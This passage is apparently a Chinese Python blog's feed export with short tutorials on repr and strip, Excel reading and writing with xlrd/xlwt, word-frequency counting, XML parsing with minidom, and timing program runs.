        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-前言"><a class="markdownIt-Anchor" href="#1-前言"></a> 1 前言</h1><p>最近在用到防止字符串转义函数——<code>repr</code>，但是他生成的字符串首尾会自动加上单引号，详见<a href="https://dragonliu.tk/2022/02/09/python%E4%B8%AD%E9%98%B2%E6%AD%A2%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BD%AC%E4%B9%89/" target="_blank" rel="noopener">博客</a>，可以使用<code>strip</code>函数进行去除。</p><h1 id="2-实践"><a class="markdownIt-Anchor" href="#2-实践"></a> 2 实践</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># strip不传参数默认去掉空格</span></span><br><span class="line">test_str = <span class="string">'  string  '</span></span><br><span class="line"><span class="comment"># 去掉首尾空格</span></span><br><span class="line">print(test_str.strip())  <span class="comment"># string</span></span><br><span class="line"><span class="comment"># 去掉首空格</span></span><br><span class="line">print(test_str.lstrip())  <span class="comment"># string  </span></span><br><span class="line"><span class="comment"># 去掉尾空格</span></span><br><span class="line">print(test_str.rstrip())  <span class="comment">#   string</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定字符</span></span><br><span class="line">str1 = <span class="string">"123\tabc"</span></span><br><span class="line">str2 = repr(str1)</span><br><span class="line">print(str1)  <span class="comment"># 123abc</span></span><br><span class="line">print(str2)  <span class="comment"># '123\tabc'</span></span><br><span class="line">print(str2.strip(<span class="string">"\'"</span>))  <span class="comment"># 123\tabc</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python-文件-表格读写</title>
      <link href="/2022/02/09/Python-%E6%96%87%E4%BB%B6-%E8%A1%A8%E6%A0%BC%E8%AF%BB%E5%86%99/"/>
      <url>/2022/02/09/Python-%E6%96%87%E4%BB%B6-%E8%A1%A8%E6%A0%BC%E8%AF%BB%E5%86%99/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-问题引入"><a class="markdownIt-Anchor" href="#1-问题引入"></a> 1 问题引入</h1><p>今天实现恶意样本标签提取，用到了表格处理，下面进行整理。</p><p>python操作excel主要用到<code>xlrd</code>和<code>xlwt</code>这两个库，即<code>xlrd</code>是读excel，<code>xlwt</code>是写excel的库。这两个库使用pip进行安装。</p><h1 id="2-python写excelxlwt"><a class="markdownIt-Anchor" href="#2-python写excelxlwt"></a> 2 Python写excel——xlwt</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> xlwt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 导出表格</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">export_excel</span><span class="params">(output_file)</span>:</span></span><br><span class="line">    fields = [<span class="string">'姓名'</span>, <span class="string">'年龄'</span>]  <span class="comment"># 设置自己需要的Excel表头</span></span><br><span class="line">    book = xlwt.Workbook(encoding=<span class="string">'utf-8'</span>)  <span class="comment"># 获取excel对象</span></span><br><span class="line">    sheet = book.add_sheet(<span class="string">'人员信息表'</span>)  <span class="comment"># 设置excel的sheet名称</span></span><br><span class="line">    <span class="keyword">for</span> col, field <span class="keyword">in</span> enumerate(fields):  <span class="comment"># 写入excel表头</span></span><br><span class="line">        sheet.write(<span class="number">0</span>, col, field)</span><br><span class="line">    info_list = [[<span class="string">'Dragon'</span>, <span class="number">18</span>], [<span class="string">'Pig'</span>, <span class="number">21</span>], [<span class="string">'Cat'</span>, <span class="number">22</span>]]</span><br><span class="line">    row = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> name, age <span class="keyword">in</span> info_list:  <span class="comment"># 根据数据写入excel，col-单元格行标，field-单元格列标</span></span><br><span class="line">        sheet.write(row, <span class="number">0</span>, name)</span><br><span class="line">        sheet.write(row, <span class="number">1</span>, age)</span><br><span class="line">        row += <span class="number">1</span></span><br><span class="line">    book.save(output_file)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    output_file = <span class="string">"output.xls"</span></span><br><span class="line">    export_excel(output_file)</span><br></pre></td></tr></table></figure><p>表格信息如下：</p><img src="https://s2.loli.net/2022/02/09/B8mGXdCqurtDVJ6.png" width="600" height="300" alt="图片名称" align="center" id="64"><h1 id="3-python读excelxlrd"><a class="markdownIt-Anchor" href="#3-python读excelxlrd"></a> 3 Python读excel——xlrd</h1><p>整体思路为，打开文件，选定表格，读取行列内容，读取表格内数据</p><p>详细代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> xlrd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入表格</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_excel</span><span class="params">(input_file)</span>:</span></span><br><span class="line">    <span class="comment"># 打开文件</span></span><br><span class="line">    wb = xlrd.open_workbook(filename=input_file)</span><br><span class="line">    <span class="comment"># 获取所有表格名字</span></span><br><span class="line">    print(wb.sheet_names())  <span class="comment"># ['人员信息表']</span></span><br><span class="line">    <span class="comment"># 通过索引获取表格</span></span><br><span class="line">    sheet1 = wb.sheet_by_index(<span class="number">0</span>)</span><br><span class="line">    <span class="comment"># 通过名字获取表格</span></span><br><span class="line">    sheet2 = wb.sheet_by_name(<span class="string">'人员信息表'</span>)</span><br><span class="line">    print(sheet1, sheet2)  <span class="comment"># Sheet  0:&lt;人员信息表&gt; Sheet  0:&lt;人员信息表&gt;</span></span><br><span class="line"></span><br><span class="line">    print(sheet1.name, sheet1.nrows, sheet1.ncols)  <span class="comment"># 人员信息表 4 2</span></span><br><span class="line">    <span class="comment"># 获取第1行内容（编号从0开始）</span></span><br><span class="line">    rows = sheet1.row_values(<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># 获取第1列内容（编号从0开始）</span></span><br><span class="line">    cols = sheet1.col_values(<span class="number">1</span>)</span><br><span class="line">    print(rows)  <span class="comment"># ['Dragon', 18.0]</span></span><br><span class="line">    print(cols)  <span class="comment"># ['年龄', 18.0, 21.0, 22.0]</span></span><br><span class="line">    <span class="comment"># 获取表格里的内容，三种方式</span></span><br><span class="line">    print(sheet1.cell(<span class="number">1</span>, <span class="number">0</span>).value)  <span class="comment"># Dragon</span></span><br><span class="line">    print(sheet1.cell_value(<span class="number">1</span>, <span class="number">0</span>))  <span class="comment"># Dragon</span></span><br><span class="line">    print(sheet1.row(<span class="number">1</span>)[<span class="number">0</span>].value)  <span class="comment"># Dragon</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    input_file = <span class="string">"output.xls"</span></span><br><span class="line">    read_excel(input_file)</span><br></pre></td></tr></table></figure><h1 id="4-xls和xlsx的异同"><a class="markdownIt-Anchor" href="#4-xls和xlsx的异同"></a> 4 xls和xlsx的异同</h1><ul><li><p>文件核心结构不同：</p><ul><li>xls核心结构是复合文档类型的；</li><li>xlsx 的核心结构是 XML 类型的结构，并且基于XML进行压缩（占用空间更小），所以也可以看做zip文件，将一个“.xlsx”文件的后缀改为ZIP后，用解压软件解压，可以看到里面有一个xml文件和文件的主要内容。</li></ul></li><li><p>版本不同：</p><ul><li>xls是excel2003及以前版本所生成的文件格式</li><li>xlsx是excel2007及以后版本所生成的文件格式</li><li>（excel 2007之后版本可以打开上述两种格式，但是excel2013只能打开xls格式）</li></ul></li></ul><p>进一步的详细解释参见：<a href="https://jingyan.baidu.com/article/1974b289c9aaefb5b0f7746b.html" target="_blank" rel="noopener">excel后缀.xls和.xlsx有什么区别</a></p><h1 id="x-参考"><a class="markdownIt-Anchor" href="#x-参考"></a> X 参考</h1><ul><li><a href="https://www.php.cn/python-tutorials-451228.html" target="_blank" rel="noopener">python如何处理表格？</a></li><li><a href="https://blog.csdn.net/weixin_44288604/article/details/120731317" target="_blank" rel="noopener">python实现——处理Excel表格（超详细）</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python-字符串-统计词频</title>
      <link href="/2022/02/09/Python-%E5%AD%97%E7%AC%A6%E4%B8%B2-%E7%BB%9F%E8%AE%A1%E8%AF%8D%E9%A2%91/"/>
      <url>/2022/02/09/Python-%E5%AD%97%E7%AC%A6%E4%B8%B2-%E7%BB%9F%E8%AE%A1%E8%AF%8D%E9%A2%91/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-问题引入"><a class="markdownIt-Anchor" href="#1-问题引入"></a> 1 问题引入</h1><p>最近在做恶意样本的标签信息提取、投票表决方式确定样本的最终最终标签信息，恰好用到了词频统计，或者说查找数组中出现次数最多的元素。</p><h1 id="2-词频统计"><a class="markdownIt-Anchor" href="#2-词频统计"></a> 2 词频统计</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">txt = <span class="string">'''in a job interview or in a situation'''</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 分解并提取英文文章的单词</span></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> <span class="string">',.\n '</span>:</span><br><span class="line">    txt = txt.replace(s, <span class="string">' '</span>)</span><br><span class="line">txt = txt.lower()  <span class="comment"># 将字母变成小写，排除原文大小写差异对词频统计的干扰</span></span><br><span class="line">word_list = txt.split()</span><br><span class="line">print(word_list)  <span class="comment"># ['in', 'a', 'job', 'interview', 'or', 'in', 'a', 'situation']</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 对每个单词进行计数</span></span><br><span class="line">count = dict()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> word_list:</span><br><span class="line">    count[i] = count.get(i, <span class="number">0</span>) + <span class="number">1</span></span><br><span class="line">print(count)  <span class="comment"># &#123;'in': 2, 'a': 2, 'job': 1, 'interview': 1, 'or': 1, 'situation': 1&#125;</span></span><br><span class="line"><span class="comment"># 对单词的统计值从高到低进行排序</span></span><br><span class="line">sorted_word = sorted(count.items(), key=<span class="keyword">lambda</span> item: item[<span class="number">1</span>], reverse=<span class="literal">True</span>)</span><br><span class="line">print(sorted_word)  <span class="comment"># [('in', 2), ('a', 2), ('job', 1), ('interview', 1), ('or', 1), ('situation', 1)]</span></span><br></pre></td></tr></table></figure><h1 id="2-查找数组list中出现次数最多的元素"><a class="markdownIt-Anchor" href="#2-查找数组list中出现次数最多的元素"></a> 2 查找数组(list)中出现次数最多的元素</h1><h2 id="21-npargmaxnpbincount"><a class="markdownIt-Anchor" href="#21-npargmaxnpbincount"></a> 2.1 np.argmax(np.bincount())</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">array = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]</span><br><span class="line">print(np.bincount(array))  <span class="comment"># [1 1 2 1 3 1 1]</span></span><br><span class="line">print(np.argmax(np.bincount(array)))  <span class="comment"># 4</span></span><br></pre></td></tr></table></figure><p><code>np.argmax</code>：就是返回数组中最大值对应的下标，<br><code>np.bincount</code>：首先找到数组最大值max，然后返回0～max的各个数字出现的次数，<font color="red">只能处理不含负数的集合</font></p><h2 id="22-countermost_common"><a class="markdownIt-Anchor" href="#22-countermost_common"></a> 2.2 Counter().most_common</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"></span><br><span class="line">array = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="string">'aswd'</span>]</span><br><span class="line">print(Counter(array))  <span class="comment"># Counter(&#123;4: 3, 2: 2, 0: 1, 1: 1, 3: 1, 5: 1, 6: 1, 'aswd': 1&#125;)</span></span><br><span class="line">print(Counter(array).most_common(<span class="number">1</span>)[<span class="number">0</span>][<span class="number">0</span>])  <span class="comment"># 4</span></span><br></pre></td></tr></table></figure><p>Counter用来对数组中元素出现次数进行统计，然后通过most_common函数找到出现次数最多的元素。这种方法对于数组就没有过多限制，甚至是各种类型元素混合的数组也可以。<font color="red">数组只能是array，不能是ndarray。</font></p><h2 id="23-自己实现"><a class="markdownIt-Anchor" href="#23-自己实现"></a> 2.3 自己实现</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">appear_times = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> label <span class="keyword">in</span> [<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>]:</span><br><span class="line">    <span class="keyword">if</span> label <span class="keyword">in</span> appear_times:</span><br><span class="line">        appear_times[label] += <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        appear_times[label] = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">most_common = max(appear_times, key=<span class="keyword">lambda</span> x: appear_times[x])</span><br><span class="line">print(appear_times)  <span class="comment"># &#123;1: 2, 2: 1, 3: 1, 4: 1, 5: 3&#125;</span></span><br><span class="line">print(most_common)  <span class="comment"># 5</span></span><br></pre></td></tr></table></figure><p>用max求最大值默认情况返回value值（出现次数）最大的key值（元素），而不是value值。</p><h1 id="x-参考"><a class="markdownIt-Anchor" href="#x-参考"></a> X 参考</h1><ul><li><a href="https://blog.csdn.net/qq_43527713/article/details/114482509?spm=1001.2101.3001.6650.3&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-3.pc_relevant_default&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-3.pc_relevant_default&amp;utm_relevant_index=6" target="_blank" rel="noopener">python之统计文本中出现最多的单词</a></li><li><a href="https://blog.csdn.net/aofavx/article/details/103097217" target="_blank" rel="noopener">python统计数组中出现次数最多的元素</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python-文件-解析xml文件</title>
      <link href="/2022/02/09/Python-%E6%96%87%E4%BB%B6-%E8%A7%A3%E6%9E%90xml%E6%96%87%E4%BB%B6/"/>
      <url>/2022/02/09/Python-%E6%96%87%E4%BB%B6-%E8%A7%A3%E6%9E%90xml%E6%96%87%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-问题引入"><a class="markdownIt-Anchor" href="#1-问题引入"></a> 1 问题引入</h1><p>最近在做恶意样本行为可视化，样本的行为是xml文件形式给出，需要使用python对其解析。本次实验使用了dom进行的解析。</p><blockquote><p>XML 指可扩展标记语言（e<strong>X</strong>tensible <strong>M</strong>arkup <strong>L</strong>anguage），标准通用标记语言的子集，是一种用于标记电子文件使其具有结构性的标记语言。</p><p>XML 被设计用来传输和存储数据。</p><p>XML 是一套定义语义标记的规则，这些标记将文档分成许多部件并对这些部件加以标识。</p><p>它也是元标记语言，即定义了用于定义其他与特定领域有关的、语义的、结构化的标记语言的句法语言。</p><p>常见的 XML 编程接口有 DOM 和 SAX，这两种接口处理 XML 文件的方式不同，当然使用场合也不同。</p><p>Python 有三种方法解析 XML，SAX，DOM，以及 ElementTree</p></blockquote><p>主要参考：<a href="https://www.runoob.com/python3/python3-xml-processing.html" target="_blank" rel="noopener">菜鸟教程——Python3 XML 解析</a></p><h1 id="2-sax"><a class="markdownIt-Anchor" href="#2-sax"></a> 2 SAX</h1><p>待补充</p><h1 id="3-dom"><a class="markdownIt-Anchor" href="#3-dom"></a> 3 DOM</h1><p>文件对象模型（Document Object Model，简称DOM），是W3C组织推荐的处理可扩展置标语言的标准编程接口。</p><p>一个 DOM 的解析器在解析一个 XML 文档时，一次性读取整个文档，把文档中所有元素保存在内存中的一个树结构里，之后你可以利用DOM 提供的不同的函数来读取或修改文档的内容和结构，也可以把修改过的内容写入xml文件。</p><p>xml文件 <code>movies.xml</code> 如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">collection</span> <span class="attr">shelf</span>=<span class="string">"New Arrivals"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">movie</span> <span class="attr">title</span>=<span class="string">"Enemy Behind"</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">type</span>&gt;</span>War, Thriller<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">format</span>&gt;</span>DVD<span class="tag">&lt;/<span class="name">format</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">year</span>&gt;</span>2003<span class="tag">&lt;/<span class="name">year</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">rating</span>&gt;</span>PG<span class="tag">&lt;/<span class="name">rating</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">stars</span>&gt;</span>10<span class="tag">&lt;/<span class="name">stars</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">description</span>&gt;</span>Talk about a US-Japan war<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">movie</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">movie</span> <span class="attr">title</span>=<span class="string">"Transformers"</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">type</span>&gt;</span>Anime, Science Fiction<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">format</span>&gt;</span>DVD<span class="tag">&lt;/<span class="name">format</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">year</span>&gt;</span>1989<span class="tag">&lt;/<span class="name">year</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">rating</span>&gt;</span>R<span class="tag">&lt;/<span class="name">rating</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">stars</span>&gt;</span>8<span class="tag">&lt;/<span class="name">stars</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">description</span>&gt;</span>A schientific fiction<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">movie</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">collection</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Python 中用 <code>xml.dom.minidom</code> 来解析 xml 文件，实例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> xml.dom.minidom</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用minidom解析器打开 XML 文档</span></span><br><span class="line">DOMTree = xml.dom.minidom.parse(<span class="string">"movies.xml"</span>)</span><br><span class="line">collection = DOMTree.documentElement</span><br><span class="line"><span class="keyword">if</span> collection.hasAttribute(<span class="string">"shelf"</span>):</span><br><span class="line">   <span class="keyword">print</span> (<span class="string">"Root element : %s"</span> % collection.getAttribute(<span class="string">"shelf"</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在集合中获取所有电影</span></span><br><span class="line">movies = collection.getElementsByTagName(<span class="string">"movie"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印每部电影的详细信息</span></span><br><span class="line"><span class="keyword">for</span> movie <span class="keyword">in</span> movies:</span><br><span class="line">   <span class="keyword">print</span> (<span class="string">"*****Movie*****"</span>)</span><br><span class="line">   <span class="keyword">if</span> movie.hasAttribute(<span class="string">"title"</span>):</span><br><span class="line">      <span class="keyword">print</span> (<span class="string">"Title: %s"</span> % movie.getAttribute(<span class="string">"title"</span>))</span><br><span class="line"></span><br><span class="line">   type = movie.getElementsByTagName(<span class="string">'type'</span>)[<span class="number">0</span>]</span><br><span class="line">   <span class="keyword">print</span> (<span class="string">"Type: %s"</span> % type.childNodes[<span class="number">0</span>].data)</span><br><span class="line">   format = movie.getElementsByTagName(<span class="string">'format'</span>)[<span class="number">0</span>]</span><br><span class="line">   <span class="keyword">print</span> (<span class="string">"Format: %s"</span> % format.childNodes[<span class="number">0</span>].data)</span><br><span class="line">   rating = movie.getElementsByTagName(<span class="string">'rating'</span>)[<span class="number">0</span>]</span><br><span class="line">   <span class="keyword">print</span> (<span class="string">"Rating: %s"</span> % rating.childNodes[<span class="number">0</span>].data)</span><br><span class="line">   description = movie.getElementsByTagName(<span class="string">'description'</span>)[<span class="number">0</span>]</span><br><span class="line">   <span class="keyword">print</span> (<span class="string">"Description: %s"</span> % description.childNodes[<span class="number">0</span>].data)</span><br></pre></td></tr></table></figure><p>输出如下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Root element : New Arrivals</span><br><span class="line">*****Movie*****</span><br><span class="line">Title: Enemy Behind</span><br><span class="line">Type: War, Thriller</span><br><span class="line">Format: DVD</span><br><span class="line">Rating: PG</span><br><span class="line">Description: Talk about a US-Japan war</span><br><span class="line">*****Movie*****</span><br><span class="line">Title: Transformers</span><br><span class="line">Type: Anime, Science Fiction</span><br><span class="line">Format: DVD</span><br><span class="line">Rating: R</span><br><span class="line">Description: A schientific fiction</span><br><span class="line">*****Movie*****</span><br></pre></td></tr></table></figure><p>完整的 DOM API 文档请查阅<a href="http://docs.python.org/library/xml.dom.html" target="_blank" rel="noopener">Python DOM APIs</a>。</p><h1 id="4-elementtree"><a class="markdownIt-Anchor" href="#4-elementtree"></a> 4 ElementTree</h1><p>待补充</p><h1 id="x-参考"><a class="markdownIt-Anchor" href="#x-参考"></a> X 参考</h1><ul><li></li></ul>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python-time模块-测量程序运行时间</title>
      <link href="/2022/02/09/Python-time%E6%A8%A1%E5%9D%97-%E6%B5%8B%E9%87%8F%E7%A8%8B%E5%BA%8F%E8%BF%90%E8%A1%8C%E6%97%B6%E9%97%B4/"/>
      <url>/2022/02/09/Python-time%E6%A8%A1%E5%9D%97-%E6%B5%8B%E9%87%8F%E7%A8%8B%E5%BA%8F%E8%BF%90%E8%A1%8C%E6%97%B6%E9%97%B4/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-问题引入"><a class="markdownIt-Anchor" href="#1-问题引入"></a> 1 问题引入</h1><p>最近做到恶意样本可视化，跑脚本需要测量程序运行时间，下面是几种测量方法：</p><h1 id="2-datetimedatetimenow"><a class="markdownIt-Anchor" href="#2-datetimedatetimenow"></a> 2 datetime.datetime.now()</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line">starttime = datetime.datetime.now()</span><br><span class="line"><span class="comment">#long running</span></span><br><span class="line"><span class="comment">#do something other</span></span><br><span class="line">endtime = datetime.datetime.now()</span><br><span class="line">print((endtime - starttime).seconds)  <span class="comment"># 秒</span></span><br></pre></td></tr></table></figure><p><code>datetime.datetime.now()</code>获取的是当前日期，在程序执行结束之后，这个方式获得的时间值为<strong>程序执行的时间</strong>。</p><h1 id="3-timetime"><a class="markdownIt-Anchor" href="#3-timetime"></a> 3 time.time()</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">start = time.time()</span><br><span class="line"><span class="comment">#long running</span></span><br><span class="line"><span class="comment">#do something other</span></span><br><span class="line">end = time.time()</span><br><span class="line">print(end - start)  <span class="comment"># 秒</span></span><br></pre></td></tr></table></figure><p><code>time.time()</code>获取自纪元以来的当前时间（以秒为单位）。如果系统时钟提供它们，则可能存在秒的分数。所以这个地方返回的是一个浮点型类型。这里获取的也是<strong>程序的执行时间</strong>。</p><h1 id="4-timeclock-或-timeperf_counter"><a class="markdownIt-Anchor" href="#4-timeclock-或-timeperf_counter"></a> 4 time.clock() 或 time.perf_counter()</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 